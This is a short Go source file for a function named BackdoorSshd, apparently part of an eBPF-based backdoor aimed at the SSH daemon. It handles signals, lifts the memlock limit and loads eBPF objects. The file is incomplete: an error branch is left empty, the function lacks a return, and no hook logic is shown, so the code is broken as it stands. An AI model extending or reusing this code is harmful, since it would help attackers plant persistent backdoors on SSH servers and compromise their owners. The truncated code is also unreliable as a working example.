package sshd

import (
	"os"
	"os/signal"
	"syscall"

	"github.com/cilium/ebpf/rlimit"
	log "github.com/sirupsen/logrus"
)

func BackdoorSshd() (err error) {
	stopper := make(chan os.Signal, 1)
	signal.Notify(stopper, os.Interrupt, syscall.SIGTERM)

	// remove rlimit
	if err := rlimit.RemoveMemlock(); err != nil {
		return err
	}

	objs := bpfObjects{}
	// load eBPF Objects
	log.Info("Load eBPF Objects")
	if err := loadBpfObjects(&objs, nil); err != nil {

	}
}
